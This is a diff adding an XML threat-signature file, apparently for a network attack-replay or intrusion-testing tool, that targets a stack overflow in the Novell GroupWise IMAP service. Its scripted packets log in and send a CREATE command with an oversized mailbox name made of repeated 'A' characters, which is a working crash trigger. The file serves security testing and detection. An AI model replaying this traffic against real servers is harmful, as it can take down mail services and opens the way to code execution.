@@ -1,0 +1,118 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Novell GroupWise Internet Agent IMAP Service Stack Buffer Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in Novell GroupWise Internet Agent. The vulnerability is within the IMAP&#13;&#10;component of the GroupWise Internet Agent service and is due to a boundary error while handling provided mailbox&#13;&#10;name for the CREATE command.&#13;&#10;An authenticated attacker could exploit this vulnerability by sending a crafted message to the server. Successful&#13;&#10;exploitation of this vulnerability could allow for a denial of service condition of the affected service, or the injection&#13;&#10;and execution of arbitrary code on the target system with System-level privileges."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="IPv6,IMAP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Novell"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Novell_Groupwise"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="7.0"/>
+      <item value="7.01"/>
+      <item value="7.02"/>
+      <item value="7.03x"/>
+      <item value="7.04"/>
+      <item value="8.0"/>
+      <item value="8.01x"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="d40d0c320731318054652832ce5a612e"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="network"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634183518296790820"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1282815010" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="srcIP" type="ImperfectControls.IPv6Address" value="null" index="L"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="M"/>
+    <NamedVar name="IMAPdestPort" type="ImperfectControls.Port" value="null" index="N"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="M"/>
+      <for index="L"/>
+      <for index="N"/>
+    </for>
+    <for index="F">
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+    <for index="G">
+      <for index="M"/>
+      <for index="L"/>
+      <for index="N"/>
+    </for>
+    <for index="H">
+      <for index="L"/>
+      <for index="M"/>
+      <for index="N"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="F" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:88:FD:B9" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$srcIP" Destination-Address="$destIP">
+        <TCP srcPort="54254" destPort="$IMAPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="002E" Checksum="" UrgentPointer="0000" Options="0101080A97E09E6E000086C5" Payload="41303031204C4F47494E207465737420666F6F626172200D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="H" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:88:FD:B9" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$srcIP" Destination-Address="$destIP">
+        <TCP srcPort="54254" destPort="$IMAPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="002E" Checksum="" UrgentPointer="0000" Options="0101080A97E09EBF000086C6" Payload="413030312043524541544520414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141410D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="0,2">
+    <Output index="D" Count="">
+      <Ethernet srcMac="00:0C:29:88:FD:B9" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$destIP" Destination-Address="$srcIP">
+          <TCP srcPort="$IMAPdestPort" destPort="54254" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="FAF0" Checksum="" UrgentPointer="0000" Options="0101080A000086C597E09E6B" Payload="2A204F4B205B4341504142494C49545920494D4150347265763120415554483D504C41494E20415554483D5847575452555354454441505020554E53454C45435420584757455854454E53494F4E535D2047726F757057697365205365727665722052656164790D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="G" Count="">
+      <Ethernet srcMac="00:0C:29:88:FD:B9" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$destIP" Destination-Address="$srcIP">
+          <TCP srcPort="$IMAPdestPort" destPort="54254" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="FAD7" Checksum="" UrgentPointer="0000" Options="0101080A000086C697E09E6E" Payload="41303031204F4B204C4F47494E20636F6D706C657465640D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
